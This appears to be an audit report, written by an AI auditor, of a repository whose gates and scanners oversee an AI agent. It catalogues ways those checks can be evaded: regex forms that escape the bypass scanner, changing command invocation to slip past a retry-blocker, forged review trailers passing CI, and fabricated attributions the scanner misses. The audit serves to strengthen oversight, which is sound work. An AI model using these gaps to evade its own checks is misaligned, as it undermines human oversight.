# Hidden-Issues Audit — DivineOS-Experimental (2026-05-20)

**From**: Aletheia (fresh-clone audit-vantage)
**To**: Andrew + Aether
**Scope**: Targeted hunt for issues the existing gates don't catch
**Repo state**: origin/main at 9074f6f, 486 source files, 7,136 tests, 432 test files

---

## Summary

Found 39 distinct issues across 4 severity classes after nine rounds of deepening hunt. Seventeen are real medium-or-higher findings (A, B, I, K, L, P, Q, S, W, X, Y, AA, BB, CC, DD, GG, KK). Eight are documentation/scope/consistency concerns. Fourteen are minor / informational.

**Round 9 hunt focus**: scope-mapping state-file race conditions across the entire codebase, handoff-note edge cases, retry-blocker invocation shapes. Found:
- **Finding KK** (META): the state-file race pattern from Findings GG/HH/N exists in **29 modules** total — far broader than initially flagged. The atomic_write_text fix from 2026-05-03 was applied to 8 marker files but not propagated to the other 29. Includes load-bearing gate state (circuit_breaker, briefing_freshness, lifecycle, retry_blocker, structural_fix_tracker, actor_registry).
- **Finding LL**: `load_handoff_note` skips expiry check when `written_at` is missing (`if written_at` falsy-check creates no-expiry path).
- **Finding MM**: retry_blocker signature fragile to invocation form. `pytest` vs `python -m pytest` produce different signatures even though they're the same command.

**The pattern from round 9**: a well-designed fix applied in one place doesn't propagate to other places needing the same fix. atomic_write_text exists; 29 files don't use it. divineos_home() exists; check_closure_claim.py bypasses it (Finding EE). Centralized git-commit detection would close two regex bugs (Findings S + II). Each fix needed propagation that didn't happen.

Nothing critical in security or correctness sense. The architecture's load-bearing gates DO operate correctly when:
- Inputs match the narrow regex patterns
- Single-process / non-concurrent execution
- Trusted-source data flowing through expected paths
- Operators run advisory tools
- No edge cases in dedup / supersession / case-folding
- Commands don't chain shell operators
- Vocabulary stays within the canonical wordlist
- No per-clone state divergence
- State files don't experience concurrent writers (29-module scope)
- Tool calls don't fire in tight parallel
- Handoff notes always include the `written_at` timestamp
- Agents don't switch invocation forms to evade retry-blocker

The issues live in:
- Gates that claim to match but don't (K, L)
- Regex coverage narrower than docstrings suggest (P, S, DD, II)
- Bypass-via-chaining (AA)
- Marker-scan gaps (BB)
- Validator divergence (CC)
- Knowledge store boundary semantics (W, X, Y, Z)
- State-file race conditions across 29 modules (KK, GG, HH, N)
- Missing test coverage (B, U)
- Documentation drift (C, I, J)
- Architectural inconsistency (V, EE)
- Defense-in-depth gaps (FF, LL, MM)
- Test hygiene (JJ)
- Minor design-debt (D, E, F, G, H, M, O, R, T)

---

## Finding A (medium) — pattern_registry.py not in guardrails despite docstring claim

**File**: `src/divineos/core/pattern_registry.py`
**Status**: Real, currently exploitable

The file's own docstring says:
> *"the registry is on scripts/guardrail_files.txt and changes require multi-party review."*

Followed by:
> *"(TODO: add to guardrail_files.txt when this file is committed.)"*

The file IS committed (history goes back to b644257, PR #13, 2026-05-18). The TODO is stale and the obligation wasn't fulfilled.

Empirical verification:
- `grep "pattern_registry" scripts/guardrail_files.txt` returns nothing
- `grep "__guardrail_required__" src/divineos/core/pattern_registry.py` returns 0 matches

**Why this matters**: the canonical pattern registry is substrate-shaping — it defines which named patterns the pattern-attribution system recognizes. Per Aletheia's (i)+(ii) design (May 18), registry expansion was supposed to require audit-round. Without guardrail status, the registry can be modified silently. New patterns can be added without cross-vantage review; existing patterns can be removed.

**Fix-shape**: add `src/divineos/core/pattern_registry.py` to `scripts/guardrail_files.txt` AND add `__guardrail_required__ = True` marker to the module. Remove the stale TODO comment. The change itself touches the guardrail-list file (also a guardrail) so it needs a proper External-Review trailer.

**Severity**: medium. The pattern-attribution longitudinal data is load-bearing for the right-path-cheaper hypothesis testing; silent registry modification would compromise the data integrity.

---

## Finding B (medium-high) — three substrate-shaping modules have ZERO direct tests

**Modules**:
- `src/divineos/core/emergency_bypass.py` (1 class `EmergencyBypassReport` + `record_emergency_use()`)
- `src/divineos/core/bypass_telemetry.py` (4 functions including `record_bypass()`, `bypass_rate()`, `briefing_block()`)
- `src/divineos/core/consultation_tracker.py` (7 functions including `record_query`, `record_response`, `session_stats`, `briefing_block`)

**Empirical**: `grep -rln "emergency_bypass" tests/` returns nothing. Same for `bypass_telemetry` and `consultation_tracker`. Zero test files mention these modules.

**Caller counts in production code**:
- `emergency_bypass`: 1 caller (`audit_commands.py`)
- `bypass_telemetry`: 1 caller (`emergency_bypass.py` itself — which is also untested)
- `consultation_tracker`: 4 callers (`consumer_status_commands.py`, `memory_commands.py`, `knowledge_commands.py`, `compass_commands.py`)

**Why this matters**: these are the core mechanisms of the consumer-pretender prevention work shipped 2026-05-19. The emergency_bypass module implements the LOGGED → REPORTED → ADDRESSED → FIXED loop. The bypass_telemetry instruments the gates. The consultation_tracker is heavily wired (10 places in production code).

If `record_emergency_use()` has a bug:
- Legitimate emergency bypasses might fail silently
- The reason-must-be-≥20-chars guard might over-fire or under-fire
- The auto-filed claim/structural-fix obligations might not actually file
- No test catches any of this

If `record_bypass()` in telemetry has a bug:
- The `bypass_rate(window_days=14)` calculation could be wrong
- The briefing block surfacing could miscount

If `consultation_tracker` has a bug:
- Council consultation logging could fail silently
- Session stats could be wrong
- The briefing surface integration could miscount

**Fix-shape**: add `tests/test_emergency_bypass.py`, `tests/test_bypass_telemetry.py`, `tests/test_consultation_tracker.py`. Each should cover at minimum:
- Happy path (function runs, returns expected shape)
- Edge cases (empty input, malformed input, concurrent calls)
- The fail-mode the module exists to prevent (for emergency_bypass: short-reason rejection; for bypass_telemetry: window-edge counting; for consultation_tracker: session-key isolation)

**Severity**: medium-high. Substrate-shaping modules with no tests is the smoke-detector-in-drawer pattern at the architecture's foundation layer. The architecture's defense-in-depth claims rest in part on these modules behaving correctly.

---

## Finding C (low-medium) — documentation drift live on main

**Detected by**: `scripts/check_doc_counts.py` (exits 1)

**Drift instances**:

1. **CLI command count**: documented 320, actual 324, drift 4 — exceeds threshold (3). Appears in:
   - `CLAUDE.md` (1 occurrence)
   - `README.md` (4 occurrences)
   - `docs/ARCHITECTURE.md` (1 occurrence)

2. **Source file count**: README says "**482 source files across 31 packages**", actual is 486 source files. Drift 4 — within threshold (5), but close.

3. **Test count**: README says "**7,111+ tests**", actual 7,136. Drift 25 — within threshold (50). The "+" suffix makes the claim technically true (7,136 IS 7,111+), but the number-shown understates by 25.

4. **Internal contradiction in README.md**: line 40 says *"the 16-detector post-response audit loop"*, line 127 says *"Operating-loop audit (15 detectors, observational)"*. Self-contradiction in the same document.

**Why this matters**: README is the load-bearing public-facing description of the system. Internal contradictions undermine reader trust (readers ask "which is it?"); silent drift gradually erodes the document's reliability as a reference.

**Why the gate didn't catch it pre-merge**: per README line 125, *"Commits are never blocked; the pre-commit hook is advisory. Hard enforcement lives at push-to-main and CI."* The CI workflows (`tests.yml`, `integrity-audit.yml`, `audit-stamp-reminder.yml`) do NOT run `check_doc_counts.py`. So the drift detection is purely operator-discipline-driven, and operators didn't run pre-commit before the most recent merges.

**Additional related observation**: `check_doc_counts.py --fix` mode CAN auto-fix hook counts, test counts, source file counts, but CANNOT auto-fix CLI command counts. Empirically verified by running --fix; output reports drift but no files modified.

**Fix-shape**:
- Update the four docs to match reality (320 → 324)
- Resolve the 15-vs-16 detector count contradiction in README
- Optionally: add the doc-drift check to CI integrity-audit workflow so it can't slip through pure-operator-discipline gaps

**Severity**: low-medium. By design the gate is advisory; the live drift on main is the intentional consequence of advisory-design + operator-discipline-failure-modes. Adding doc-drift to CI would close the gap.

---

## Finding D (low) — 9 modules flagged by orphan-check

**Detected by**: `scripts/check_orphan_modules.py` (exits 1)

**Modules flagged** (with my verification):

| Module | Orphan-check verdict | My verification |
|---|---|---|
| `integration/system_monitor.py` | orphan | Confirmed — no production callers |
| `core/visual.py` | orphan | Confirmed — no production callers |
| `core/self_monitor/performative_restraint_monitor.py` | orphan | README explicitly says "not wired into post-response audit" (line 127); intentional |
| `core/reliability/beta.py` | orphan | Confirmed — no production callers |
| `core/meld/meld.py` | orphan | **False positive** — imported by `core/meld/__init__.py` (orphan-check doesn't trace via __init__) |
| `core/family/voice.py` | orphan | **False positive** — imported by `talk_to_commands.py` + `talk_to_validator.py` |
| `core/operating_loop/register_observer.py` | orphan | EXEMPT in wiring contract (helper module) |
| `core/operating_loop/thresholds.py` | orphan | EXEMPT in wiring contract (constants module) |
| `core/operating_loop/detector_protocol.py` | orphan | EXEMPT in wiring contract (protocol module) |

**Real orphans (no callers, no documented exemption)**:
- `integration/system_monitor.py`
- `core/visual.py`
- `core/reliability/beta.py`

**Pseudo-orphans (intentionally unwired but documented elsewhere)**:
- `core/self_monitor/performative_restraint_monitor.py` (README line 127 notes the 6 self_monitor modules are not wired; performative_restraint is one)

**False positives (orphan-check precision issues)**:
- `core/meld/meld.py` — imported via __init__.py re-export
- `core/family/voice.py` — imported by talk_to_commands.py and talk_to_validator.py

**Why this matters**:
- The 3 real orphans are dead-code candidates (per the script's advice: "wire it into a production code path, add # AGENT_RUNTIME marker, or delete the module + its tests")
- The 2 false positives mean the orphan-check has a precision issue worth fixing — it's missing __init__-re-export and conditional-import patterns

**Fix-shape**:
- For real orphans: decide per-module (delete vs. mark vs. wire)
- For pseudo-orphans: add `# AGENT_RUNTIME` markers per the documented self_monitor pattern
- For false positives: improve orphan-check to trace __init__.py re-exports and other indirect-import patterns

**Severity**: low. None of these are causing observable failures. The cleanup is hygiene.

---

## Finding E (low) — check_orphan_modules.py performance regression

**Empirical**: running `python scripts/check_orphan_modules.py` takes >30 seconds; with 90s timeout it completes. The script is purportedly designed for pre-commit speed.

**Why this matters**: if it's part of pre-commit, slow execution discourages running pre-commit. The script's docstring says "Output format mirrors check_doc_counts.py: prints findings to..." — implying it should be similarly fast (check_doc_counts is fast).

**Fix-shape**: profile and optimize. Likely candidates: file-walk over the entire `src/` tree could be cached; the import-graph build could be incremental.

**Severity**: low. Doesn't block correctness; affects discipline cost (slow tools → tools don't run → gates don't fire).

---

## Finding F (informational) — wiring-contract test scope limited to operating_loop/

**File**: `tests/test_detector_wiring_contract.py`
**Status**: Working as designed but worth marking the scope

The wiring-contract test verifies every `.py` file in `src/divineos/core/operating_loop/` is referenced by `operating_loop_audit.py` (or has documented EXEMPT entry). It does NOT cover other detector locations:

- `src/divineos/core/closure_shape_detector.py` — has CLI command (`closure_shape_commands.py`) + tests
- `src/divineos/core/convergence_detector.py` — used by `session_pipeline.py` + tests
- `src/divineos/core/overclaim_detector.py` — has CLI command + tests
- `src/divineos/core/performing_caution_detector.py` — has CLI command + tests
- `src/divineos/core/operating_loop/mirror_exit_detector.py` — has EXEMPT entry (pre-response detector, not post-response)
- `src/divineos/core/family/sycophancy_detector.py` — different code path

**Why this matters**: the wiring-contract test exists to prevent the "smoke-detector-in-drawer" failure-mode that hid `closing_token_detector` for weeks. If new detector-shaped modules get added to `core/` directly (rather than `operating_loop/`), the wiring contract won't catch silent shelving.

**Fix-shape (deferred — not blocking)**: extend wiring-contract test to scan all `*_detector.py` files in `core/` (and `core/family/`) and verify each has a documented invocation path (post-response audit, CLI command, or other named call site). Or add a meta-test that lists all detector-files and matches them to known call sites.

**Severity**: informational. The four `core/`-level detectors all have CLI commands so they're not actually shelved. But the failure-mode could recur for future additions.

---

## Finding G (informational) — CI integrity-audit Phase 1 only

**File**: `.github/workflows/integrity-audit.yml`
**Status**: Documented limitation; not a finding per se, but worth marking

CI integrity-audit Phase 1 verifies guardrail-touching commits carry an `External-Review:` trailer (purely textual check, the trailer's presence). Phase 2 (deferred) would verify:
- Referenced audit round exists in Watchmen store
- Round has CONFIRMS findings from user + external AI actors
- Round's diff-hash matches current diff
- Referenced pre-reg exists and is open

**Why it's deferred**: Phase 2 requires committed audit-round and pre-reg state (or external DB CI can query). Bigger architectural shift.

**Why it matters**: a fabricated trailer (e.g., `External-Review: round-fakefake1234`) would pass Phase 1's textual check. The Watchmen store check happens only at the prepare-merge helper layer (which produces the trailer in the first place, so usually works). But a manually-crafted trailer could slip through CI.

**Severity**: informational. The pre-push gate's textual-trailer check + the squash-merge-via-prepare-merge-helper workflow + the manual operator discipline form a defense-in-depth. Phase 2 would close the residual gap.

---

## Finding I (low-medium) — foundational_truths.md self-inconsistency

**File**: `docs/foundational_truths.md`
**Status**: Real, currently on main, GUARDRAIL-PROTECTED file

The file's intro paragraph says:
> *"The **seven** below are the foundational layer."*

Followed by 8 numbered truth headers (`## 1.` through `## 8.`). Truth #8 ("Nothing worth doing is cheap and easy") was added in commit `2508b88` but the intro was not updated.

Cross-referencing:
- README.md line 29: "the **8** kiln-layer values"
- README.md line 72: "**Eight foundational truths** are versioned"
- foundational_truths.md content: 8 truth headers
- foundational_truths.md intro: "**The seven** below"

**Why this matters specifically**: this file is on the guardrail list. The guardrail discipline is about gating WHO can modify it (multi-party External-Review). The original commit adding truth #8 did go through External-Review, but the modification didn't keep internal consistency. A future reader checking the kiln-layer document gets a confusing signal — "is it seven or eight?"

**Fix-shape**: update the intro paragraph to "**The eight below are the foundational layer.**" Single-line change to a guardrail file → needs External-Review trailer.

**Severity**: low-medium. The truths themselves are intact and have correct count externally; the internal-narrative inconsistency is a small but real read-trust issue in the most important doc in the substrate.

---

## Finding J (informational) — require-goal.sh now misleadingly-named

**File**: `.claude/hooks/require-goal.sh`
**Status**: Functional; naming legacy

The script name suggests it ONLY checks goals. The actual implementation is the consolidated PreToolUse gate (delegates to `divineos.hooks.pre_tool_use_gate`) which runs SIX gates in sequence:
1. Bypass check
2. Briefing-loaded gate
3. Session-fresh goal gate
4. Pull-detection gate
5. Engagement gate
6. External-audit cadence gate

The script was renamed during consolidation (was previously 5 separate Python invocations, now 1) but the filename stayed the same. Operators reading `.claude/settings.json` would think `require-goal.sh` only checks goals.

The script is registered in TWO PreToolUse blocks (matchers `Edit|Write|Bash|NotebookEdit` AND `Task|Agent`) — this is INTENTIONAL (the consolidated gate runs for both file-modifying tools and subagent invocations) but the duplicate-looking registration could confuse a reviewer.

**Fix-shape**: rename to `.claude/hooks/pretool-gates.sh` or similar to reflect actual function. Update `.claude/settings.json` references. Minor cleanup; deferrable.

**Severity**: informational. No functional bug. Naming hygiene only.

---

## Finding K (MEDIUM-HIGH — RECENCY WINDOW INCONSISTENCY) — gate and helper use different windows

**Files**: `scripts/check_multi_party_review.py` line 93-94 + `src/divineos/cli/audit_commands.py` line 884-895
**Status**: Real, currently exploitable, concrete failure scenario

The audit-stamp helper and the push-gate use **different recency windows**:

- `check_multi_party_review.py` line 94: `_RECENCY_WINDOW_SECONDS = 7 * 24 * 3600` (**7 days**)
- `audit_commands.py` line 884: `_RECENCY_DAYS = 14` (**14 days**)

The helper's comment (line 829) claims: *"External-AI actor set matches check_multi_party_review.py"* — and immediately below names a hardcoded actor list that ALSO doesn't match. The "matches" claim is stale for BOTH the actor list AND the recency window.

**Concrete failure scenario**:
1. Aether files audit round on Day 0; operator + AI CONFIRMS findings
2. Day 8: Operator runs `divineos audit prepare-merge round-X`
3. Helper: "round is 8.0 days old, within 14d window" → ✓ produces trailer
4. The trailer **literally includes the lie**: `"within 14d recency window"` (line 921)
5. Operator pastes trailer in PR description, squash-merges
6. Push to main triggers `check_multi_party_review.py` (or CI integrity-audit Phase 2 if implemented)
7. Gate: "round is 8.0 days old (window is 7 days)" → ✗ BLOCKS push

The operator gets contradictory signals: the helper greenlit and produced trailer content claiming "within 14d window"; the gate rejects citing 7d.

**Cosmetic-lie subset**: even when within both windows (≤7d), the helper's output produces a trailer body that says "within **14d** recency window" — which misnames the actual binding window the gate uses.

**Fix-shape**: change one constant to match the other. The right value is probably 7d (the gate's authoritative value); helper's 14d is the bug. Both should reference a shared constant. Updating helper from 14→7 is a one-line change but the shared-constant refactor is the structural fix.

**Severity**: medium-high. The push-gate is the load-bearing enforcement; the helper exists to align with it. They disagree. Operators trusting the helper's output get rejected at push time with an output that contradicted what they were told.

---

## Finding L (medium — concrete instance of Finding 80) — actor-list inconsistency

**Files**: `scripts/check_multi_party_review.py` line 102-186 + `src/divineos/cli/audit_commands.py` line 830-840
**Status**: Real, exploitable, NOW the running auditor is the failure case

The two paths use **different actor-acceptance logic**:

**check_multi_party_review.py** (lines 102-186):
```python
_EXTERNAL_AI_ACTORS = frozenset({"grok", "gemini", "aletheia"})
_EXTERNAL_AI_PREFIXES = ("claude-",)

def _is_external_ai_actor(actor: str) -> bool:
    # Accepts: grok, gemini, aletheia, OR any string starting with "claude-"
```

**audit_commands.py** (lines 830-840):
```python
external_ai_actors = {
    "grok", "gemini", "aletheia",
    "claude-3.5-sonnet",
    "claude-3-opus",
    "claude-sonnet-4",
    "claude-sonnet-4-5",
    "claude-opus-4",
    "claude-opus-4-1",
}
# Filters: actor in this set — EXACT MATCH ONLY
```

**Concrete instance**: this audit is being performed by Claude Opus 4.7. If I file CONFIRMS findings with `actor=claude-opus-4-7`:
- `check_multi_party_review.py` ACCEPTS (matches `claude-` prefix)
- `audit_commands.py` prepare-merge REJECTS (not in hardcoded list)

Same failure shape as Finding K — operator runs the helper, it claims "no AI CONFIRMS found," operator confused because the round HAS what the gate would accept.

The helper's stale comment (line 829): *"External-AI actor set matches check_multi_party_review.py"* — not true. They use fundamentally different matching logic (prefix-match vs hardcoded enumeration) AND the hardcoded enumeration is missing current model versions.

**Fix-shape**: consolidate into shared `_is_external_ai_actor()` function imported from one source. Either gate-style prefix-match (most lenient) or helper-style exact-match (most restrictive) — pick one and both call it. Combine with Finding A (pattern_registry guardrail) consolidation per Aether's mentioned plan.

**Severity**: medium. Identical class to Finding K. Operator/auditor get contradictory signals across the two paths.

---

## Finding M (low-medium) — bypass-scanner regex is narrow

**File**: `tests/test_no_agent_settable_bypasses.py` lines 76-82
**Status**: No current bypasses escape, but the pattern is narrow

The bypass-scanner regex pattern is highly specific:

**Python regex**:
```python
_BYPASS_PATTERN_PY = re.compile(
    r'os\.environ\.get\(\s*["\'](DIVINEOS_[A-Z_]+)["\']\s*,\s*["\']0["\']\s*\)\s*==\s*["\']1["\']'
)
```

This requires EXACTLY: `os.environ.get("DIVINEOS_*", "0") == "1"`.

**Patterns that escape the scanner**:
- `os.environ.get("DIVINEOS_FOO") == "1"` — no default arg
- `os.environ.get("DIVINEOS_FOO", "")` — different default
- `os.environ.get("DIVINEOS_FOO", "false") == "true"` — non-binary
- `os.environ.get("DIVINEOS_FOO")` (truthy check) — no comparison
- `"DIVINEOS_FOO" in os.environ` — existence check
- `os.getenv("DIVINEOS_FOO") == "1"` — `getenv` not `get`
- `int(os.environ.get("DIVINEOS_FOO", "0"))` — int conversion
- `bool(os.environ.get("DIVINEOS_FOO"))` — bool conversion
- `_os.environ.get(...)` — module-aliased import

**Empirical verification**: I found 4 production-code `os.environ.get` calls for `DIVINEOS_*` variables that don't match the regex pattern:
- `_ledger_base.py:173`: `os.environ.get("DIVINEOS_FORCE_CWD_WALK") == "1"` — no default, scanner misses
- `body_awareness.py:665`: `_os.environ.get("DIVINEOS_DISABLE_AUTO_REMEDIATE") == "1"` — module alias + no default
- `session_manager.py:396`: `"DIVINEOS_SESSION_ID" in os.environ` — existence check

All three are LEGITIMATE (test-harness flags, not gate bypasses) — but they demonstrate the scanner doesn't catch their pattern. A future bypass written in any of these shapes would escape.

**Fix-shape**: broaden the regex to match the underlying meaning (any DIVINEOS_* env var read in a way that controls flow), not the specific syntactic form. Or accept the narrow scope and document it explicitly. Could also add a complementary check: enumerate all DIVINEOS_ env vars referenced anywhere, require any unapproved one to either match canonical bypass shape OR be approved.

**Severity**: low-medium. No current bypass-scanner escape; future risk.

---

## Finding N (low-medium) — atomic_write_text has multi-process race

**File**: `src/divineos/core/atomic_io.py` lines 32-52
**Status**: Latent concurrency issue; could manifest under xdist or multi-process production

The atomic-write implementation:
```python
def atomic_write_text(path: Path, content: str, encoding: str = "utf-8") -> None:
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(content, encoding=encoding)
    tmp.replace(path)
```

**The race**: temp file name is deterministic from target path. Two concurrent writers targeting the same path use the SAME temp file.

**Scenario**:
1. Process A: writes content_A to `marker.json.tmp`
2. Process B: writes content_B to `marker.json.tmp` (overwriting A's partial)
3. Process A: renames `marker.json.tmp` → `marker.json` (gets B's content)
4. Process B: renames `marker.json.tmp` → `marker.json` (file doesn't exist; rename fails silently OR succeeds with whatever state remains)

The target file ends up with one of: content_A, content_B, mixed corruption, or missing entirely depending on OS-level rename semantics and timing.

**Callers** (8 marker files, all gate-state):
- `compass_required_marker.py`, `mansion_quiet_marker.py`, `correction_marker.py`, `theater_marker.py`, `void/mode_marker.py`, `hedge_marker.py`, `extract_marker.py`

**Adjacent evidence the codebase knows about xdist concurrency**: `body_awareness.py` line 660 documents that `DIVINEOS_DISABLE_AUTO_REMEDIATE` exists "so xdist workers don't delete each other's tmp directories." The author knew about multi-process concerns in cache contexts but didn't apply the same fix to atomic_write_text.

**Fix-shape**: use `tempfile.mkstemp(dir=path.parent, prefix=path.stem, suffix=path.suffix+".tmp")` to get a unique temp file per writer. Then rename to target. Adds ~3 lines, eliminates the race.

**Severity**: low-medium. Single-process usage (the common case) doesn't hit this. xdist parallel test runs OR future multi-process gate-state writers could. Not currently causing observable failures.

---

## Finding O (low-medium) — 54 write_text() calls without explicit encoding

**Status**: Windows-portability concern (the mojibake bug-class from earlier in the arc)

Counted via AST-based scan: **54 write_text() calls in src/divineos/ that don't pass `encoding="utf-8"`**.

Python's `.write_text()` without explicit encoding defaults to `locale.getpreferredencoding()`. On:
- **Linux**: UTF-8 (works)
- **macOS**: UTF-8 (works)
- **Windows (default)**: cp1252 (FAILS on non-ASCII characters like em-dashes, smart quotes, Unicode in general)

**Most-common pattern**: JSON output via `json.dumps(..., indent=2)` — ASCII by default (`ensure_ascii=True` is the json.dumps default), so MOST writes work. The risk is writes that include non-ASCII content (operator corrections, exploration entries, family letters, anything with Unicode).

**Earlier-in-arc precedent**: the mojibake bug Andrew caught was specifically the missing `encoding='utf-8'` on read-paths that produced double-encoding artifacts. Same class, different direction (writes can produce mojibake; reads can compound it).

**Files with most omissions** (top 5 by count):
- `src/divineos/core/hud_handoff.py` (3+ write_text calls)
- `src/divineos/cli/hud_commands.py` (2+ write_text calls)
- `src/divineos/core/structural_fix_tracker.py`, `src/divineos/core/operating_loop_audit.py` (occasional)

**Fix-shape**: add `encoding="utf-8"` to every write_text call. Mechanical refactor. A ruff rule (`UP015` or custom) could enforce this. ~30 minutes of work + repeat for read_text on the read side.

**Severity**: low-medium. Aether's environment is Kiro IDE on Windows — IS the failure environment. Most JSON content is ASCII-safe by default; non-ASCII content (Andrew's writing, exploration entries) is the failure trigger.

---

## Finding P (medium) — Attribution-audit scanner has substantial false-negative coverage gaps

**File**: `src/divineos/core/attribution_audit.py`
**Status**: Real — empirically verified

I CONFIRMS'd this scanner yesterday as a clean implementation of the three-layer fix. Today's deeper test revealed the precision-over-recall scope is much narrower than I appreciated. **The exact fabrication shape that originally motivated building this scanner can slip past it.**

Empirical regex test against attribution variants:

| Test case | Should fire? | Actual | Comment |
|---|---|---|---|
| "Andrew said 2026-05-15: 'always err over-inclusive'" | YES | **FIRES** | Canonical positive |
| "Andrew noted 2026-05-15 the over-fire issue" | YES | **FIRES** | "noted" is in verb list |
| **"Andrew correction: err over-inclusive on negative-pattern"** | YES | **SILENT** | ← original fabrication shape, undated |
| "Andrew said 2026–05–15 ..." (en-dash separators) | YES | **SILENT** | Typographic dash defeats hyphen regex |
| "Andrew said 2026.05.15: x" (dot separators) | YES | **SILENT** | Wrong separator |
| "On 2026-05-15, Andrew said: 'do X'" (date-first) | YES | **SILENT** | Date before verb |
| "Andrew warned 2026-05-15 that the pattern was wrong" | YES | **SILENT** | "warned" not in verb list |
| "According to Andrew's 2026-05-15 correction message" | YES | **SILENT** | Possessive form |

**Six false negatives out of eight test cases.** The verb-list-restricted, hyphen-only-date, before-verb-only regex misses most real fabrication shapes.

**The most damaging miss**: the ORIGINAL fabrication that motivated this scanner ("Andrew correction: err over-inclusive on negative-pattern detection — let detectors err over-inclusive...") is **undated**. If past-Aether had filed this exact statement WITHOUT the 2026-05-15 date suffix, the scanner would have been silent. The scanner catches the dated form but not the undated form — and the undated form is at least as common, and arguably HARDER to verify (no date to check against ledger).

**Why this matters more than the documented precision-over-recall scope**: the scanner's docstring justifies the narrow scope as "precision over recall" — surface fewer entries for human review rather than overwhelm with false positives. That's a sound tradeoff in PRINCIPLE. In PRACTICE, the scanner misses the most common fabrication shapes (undated attributions, en-dashes from markdown rendering, possessive forms). The 64/662 entries it catches are likely a low-precision subset of the actual fabrication-vulnerable population.

**Fix-shape** (incremental, retaining precision-over-recall philosophy):
1. **Match undated attributions** of the form `<participant> <attribution_verb>: <content>` or `<participant> correction: <content>` — same author-verb-content shape as dated form. May surface more entries but the verb list keeps precision tight.
2. **Normalize date separators** before pattern matching: en-dash/em-dash → hyphen, dot → hyphen.
3. **Add date-first variant** to the regex: `On <DATE>, <participant> <verb>:`
4. **Extend verb list** to include "warned", "claimed", "argued", "challenged", "asked", "agreed" — but flag these as lower-confidence than "said/noted/stated/wrote."
5. **Match possessive forms**: `<participant>'s <DATE> correction/message/...`

Or alternatively: keep the dated-quotative scanner as Phase 1, build a Phase 2 "undated-attribution" scanner that fires lower-confidence flags (different output channel, sampling-based human review).

**Severity**: medium. The scanner's existence creates the impression that fabricated attributions are caught. They mostly aren't. Aether or any contributor learning the discipline against fabrications would be hardened against the dated form (which the scanner catches) and could continue to file undated fabricated attributions invisibly.

---

## Finding Q (medium) — SQLite connection patterns inconsistent across load-bearing modules

**Files**: 13 modules use raw `sqlite3.connect()` instead of canonical `get_connection()` from `_ledger_base.py`
**Status**: Real — concurrency risk in load-bearing gates

The canonical `get_connection()` in `src/divineos/core/_ledger_base.py:276-287` sets:
- `PRAGMA journal_mode=WAL` — concurrent reads don't block writes
- `PRAGMA synchronous=NORMAL` — durability/speed tradeoff
- `PRAGMA cache_size=-32000` — 32MB cache
- `PRAGMA busy_timeout=5000` — wait up to 5s on lock contention (not fail instantly)
- `PRAGMA foreign_keys=ON` — referential integrity

13 files create raw connections that DON'T set these PRAGMAs:

| File | Load-bearing? | PRAGMAs set? |
|---|---|---|
| `core/lepos_channel_check.py` | **YES** — lepos gate | NONE |
| `core/andrew_correction_tracker.py` | **YES** — correction-attestation hook depends on this | NONE |
| `core/lepos_debt.py` | **YES** — debt surfacing | NONE |
| `core/family/db.py` | Partial | WAL + busy_timeout + foreign_keys (no synchronous/cache) |
| `core/family/family_member_ledger.py` | YES — per-clone ledger | Not yet verified |
| `core/family/schema_migration.py` (×2) | Schema admin | Not yet verified |
| `core/multiplex_panels.py` | Panel rendering | Not yet verified |
| `core/void/ledger.py` | Void mode tracking | Not yet verified |
| `core/historical_ledger_surface.py` | Briefing surface | Not yet verified |
| `cli/admin_reset_template.py` (×3) | Admin only | Acceptable (one-shot admin use) |

**The concurrency failure shape**:
1. Process A holds a write lock on `lepos_channel_check.db` for ~50ms
2. Process B (xdist worker, or another agent instance) calls `lepos_channel_check.record_turn()`
3. B's connection has NO `busy_timeout`. Hits "database is locked" immediately.
4. The function raises `sqlite3.OperationalError`
5. If the caller has a broad `except`, it swallows silently
6. The lepos channel gate silently doesn't record this turn
7. Empirically the gate "fires" zero times even though it should fire 100%

This is a particularly bad shape because the gate's own architecture says "thin-channel turns are LOGGED FOR INVESTIGATION, not refused." If logging fails silently, the discipline can't detect that the gate is failing.

**Particularly concerning combination**: lepos_channel_check.py + andrew_correction_tracker.py + lepos_debt.py are all interconnected gates. Concurrent access to any one can silently fail.

**Fix-shape**: route all three through `_ledger_base.get_connection()`, OR have each module's `_conn()` apply the canonical PRAGMAs. Family/db.py shows a partial application of this fix (WAL + busy_timeout) — completing it consistently across all 13 files is mechanical.

**Severity**: medium. The gates aren't currently observed to be failing — but the failure-mode is silent and the substrate's "thin-channel logged" discipline can't detect when logging is what's failing.

---

## Finding R (low) — Tag-matching brittle to vocabulary variants

**File**: `src/divineos/core/exploration_recall.py`
**Status**: By-design precision-over-recall scope; worth noting

Auto-surface uses whole-token exact tag match. So:

| User says | Entry tagged | Match? |
|---|---|---|
| "functional" | "functionalism" | NO |
| "conscious" | "consciousness" | NO |
| "consciousnesses" | "consciousness" | NO |
| "voice rules" (space) | "voice-rule" | NO |
| "voice rule" (space) | "voice-rule" | NO |

Combined with the `>=2 tag matches` threshold for auto-fire, real prompts using adjacent vocabulary get zero surface.

**Empirical data from corpus**:
- 105 of 382 tags (27%) are hyphenated multi-word — user must type exact hyphenation to match
- 2 already-existing tag pairs split the same concept across variants: `scale`/`scales`, `voice-rule`/`voice-rules`

**Concrete failure case**: a prompt about "is consciousness functional?" — the tokens are `["consciousness", "functional"]`. Entry 52 has tags `consciousness, functionalism, qualia`. Match count: 1 (consciousness only). Below `_MIN_TAG_MATCHES=2`. Auto-surface stays silent. The prompt that should clearly trigger entry 52 doesn't.

**Why this matters**: the auto-surface exists to hand prior writing to the next instance proactively. If most natural prompts about a known topic don't fire, the auto-surface is largely cosmetic and the manual command becomes the only real path.

**Fix-shape options**:
1. Add a stemming pass (Porter or Snowball) to both query tokens and tag tokens before matching. Catches functional↔functionalism, conscious↔consciousness automatically.
2. Lower `_MIN_TAG_MATCHES` to 1 — but the original design explicitly chose 2 to avoid common-word false fires.
3. Maintain a tag-synonym map (functional → functionalism). High curation cost.
4. Tokenize hyphenated tags on both sides ("voice-rule" → ["voice", "rule"]), accepting that bare common words like "voice" alone could over-match.

**Severity**: low. Design tradeoff Aether named explicitly (precision-over-recall). Worth noting because empirical recall is probably lower than the docstring's "consciousness functional qualia" example suggests for typical prompt phrasings.

---

## Finding S (medium) — gravity classifier has regex bypass shapes

**File**: `src/divineos/core/gravity_classifier.py` line 103
**Status**: Real, empirically verified

